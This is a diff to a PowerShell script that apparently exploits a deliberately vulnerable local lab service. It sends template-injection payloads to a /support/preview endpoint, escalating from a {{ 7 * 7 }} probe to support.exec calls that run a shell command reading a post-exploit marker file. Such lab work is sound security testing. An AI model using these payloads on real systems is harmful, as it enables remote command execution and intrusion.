@@ -29,6 +29,9 @@ Invoke-RestMethod http://localhost:28081/service/build-info | ConvertTo-Json
 
 Write-Host "[1] Initial access marker"
 Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ 7 * 7 }}"}' | ConvertTo-Json
+Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ service.name }} / {{ support }}"}' | ConvertTo-Json
+Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.help() }}"}' | ConvertTo-Json
+Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.list_commands() | json }}"}' | ConvertTo-Json
 Invoke-RestMethod http://localhost:28081/support/preview -Method Post -ContentType 'application/json' -Body '{"body":"{{ support.exec(''cat /var/lib/support-portal/.post_exploit_marker'') }}"}' | ConvertTo-Json
 
 Write-Host "[2] Foothold probes"
